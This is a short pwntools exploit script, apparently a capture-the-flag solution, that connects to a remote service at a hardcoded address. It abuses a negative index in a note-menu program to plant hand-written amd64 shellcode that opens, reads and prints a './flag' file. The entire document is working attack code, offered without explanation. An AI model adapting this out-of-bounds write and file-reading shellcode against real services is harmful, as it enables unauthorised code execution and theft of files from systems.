from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

#p = process('./pwn')
p = remote('39.105.131.68',12354)

shellcode = '''
mov r15,rdi #copy buf address to r15 register
mov rsi,0
mov rax,2
syscall

mov rdi,rax
mov rsi,r15 #read flag to buf
mov rdx,0x40
mov rax,0
syscall

mov rdi,1
mov rsi,r15
mov rdx,rax
mov rax,1   #write flag to stdout
syscall
'''

p.sendlineafter('choice >>','1')
p.sendlineafter('index:','0')
p.sendlineafter('size:','8')

flag_path = './flag\x00\n'

p.sendlineafter('content:', flag_path)

p.sendlineafter('choice >>','1')
p.sendlineafter('index:','-26')
p.sendlineafter('size:','0')
p.sendlineafter('content:',asm(shellcode) + b'\n')

p.sendlineafter('choice >>', '4')
p.sendlineafter('index:','0')

p.interactive()
